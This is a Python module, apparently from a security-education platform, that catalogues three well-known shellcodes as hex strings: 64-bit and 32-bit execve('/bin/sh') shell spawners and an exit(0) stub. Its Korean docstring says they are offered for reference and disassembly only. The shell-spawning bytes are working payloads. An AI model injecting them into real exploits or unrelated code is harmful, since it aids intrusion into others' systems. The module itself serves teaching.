"""셸코드 참조 데이터베이스.

학습용으로 잘 알려진 x86/x86-64 셸코드를 카탈로그화한다. 여기 담긴 바이트는
공개적으로 문서화된 교육용 예제이며, 플랫폼은 이를 **실행하지 않고** 참조·디스어셈블
용도로만 제공한다.
"""

from __future__ import annotations

from dataclasses import dataclass


@dataclass
class Shellcode:
    slug: str
    title: str
    arch: str  # "amd64" | "i386"
    description: str
    bytes_hex: str

    @property
    def raw(self) -> bytes:
        return bytes.fromhex(self.bytes_hex)

    @property
    def length(self) -> int:
        return len(self.raw)

    def as_dict(self) -> dict:
        return {
            "slug": self.slug,
            "title": self.title,
            "arch": self.arch,
            "description": self.description,
            "bytes_hex": self.bytes_hex,
            "length": self.length,
        }


_CATALOG: list[Shellcode] = [
    Shellcode(
        slug="amd64-execve-sh",
        title="execve(\"/bin/sh\", NULL, NULL)",
        arch="amd64",
        description="가장 표준적인 x86-64 셸 스폰 셸코드(널바이트 없음).",
        bytes_hex="31c048bb2f62696e2f2f7368534889e7"
        "31f631d26a3b580f05",
    ),
    Shellcode(
        slug="i386-execve-sh",
        title="execve(\"/bin/sh\", NULL, NULL) — 32bit",
        arch="i386",
        description="고전적인 25바이트 int 0x80 셸코드.",
        bytes_hex="31c050682f2f7368682f62696e89e3505389e131d2b00bcd80",
    ),
    Shellcode(
        slug="amd64-exit",
        title="exit(0)",
        arch="amd64",
        description="정상 종료 syscall — 페이로드 마무리 예시.",
        bytes_hex="6a3c5831ff0f05",
    ),
]

_BY_SLUG = {s.slug: s for s in _CATALOG}


def list_shellcode(arch: str | None = None) -> list[Shellcode]:
    if arch:
        return [s for s in _CATALOG if s.arch == arch]
    return list(_CATALOG)


def get_shellcode(slug: str) -> Shellcode | None:
    return _BY_SLUG.get(slug)
